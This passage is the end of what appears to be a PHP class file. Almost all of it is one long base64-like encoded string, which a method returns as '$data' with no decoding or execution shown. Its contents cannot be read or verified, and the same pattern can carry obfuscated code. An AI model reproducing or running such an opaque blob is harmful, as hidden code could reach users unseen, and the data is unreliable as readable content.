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";
        return $data;
        
    }
}
?>